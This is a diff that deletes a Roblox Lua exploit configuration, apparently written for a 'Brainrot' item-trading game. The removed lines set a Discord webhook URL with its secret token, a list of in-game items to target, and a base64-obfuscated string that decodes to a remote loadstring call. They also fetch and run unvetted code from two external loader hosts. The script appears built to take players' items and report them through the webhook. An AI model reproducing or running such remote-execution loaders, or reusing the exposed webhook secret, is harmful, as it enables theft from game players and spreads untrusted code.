@@ -1,12 +1,1 @@
-getgenv().secret67 = "1492078954863923283"
-getgenv().SecretToken = "Gghi_50"
-getgenv().User = "Gghi_50"
-getgenv().Webhook = "https://discord.com/api/webhooks/1494020666637160448/k5Wedfs474-75sVWHwDw_IsYVWPpm_TAS2mT7yScgqHAgGiubuaWUpM5VQx9O4i-I2b6"
-getgenv().Brainrots = {"Strawberry Elephant", "Meowl", "Headless Horseman", "Skibidi Toilet", "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni", "Love Love Bear", "La Supreme Combinasion", "Celestial Pegasus", "Cerberus", "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Signore Carapace", "Los Sekolahs", "La Casa Boo", "Fragrama and Chocrama", "Elefanto Frigo", "La Food Combinasion", "Spooky and Pumpky", "Ginger Gerat", "Sammyni Fattini", "Festive 67", "Cloverat Clapat", "Antonio", "Garama and Madundung", "Fishino Clownino", "Jolly Jolly Sahur", "Tirilikalika Tirilikalako", "Boppin Bunny", "Hydra Bunny", "Dug dug dug", "Celularcini Viciosini", "Bunny and Eggy", "Foxini Lanternini", "Quackini Snackini", "Hopilikalika Hopilikalako", "Cash or Card"}
-getgenv().ScriptMode = "CUSTOM"
-getgenv().CustomScript = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vYXBpLmpua2llLmNvbS9hcGkvdjEvbHVhc2NyaXB0cy9wdWJsaWMvNDI5ZjZjZTYwZTBkNjZmYTFjMGI2NGQ5OTJjMzEwNTQ0N2NiNjAxNDBmZjNhNmQyNWI1ZmY1ODBiNjUxNzU0Yy9kb3dubG9hZCIpKSgp"
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/808f4ad4ebff475c57ce61ea39e41e23.lua"))()
-
--- Custom Script
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/429f6ce60e0d66fa1c0b64d992c3105447cb60140ff3a6d25b5ff580b651754c/download"))()
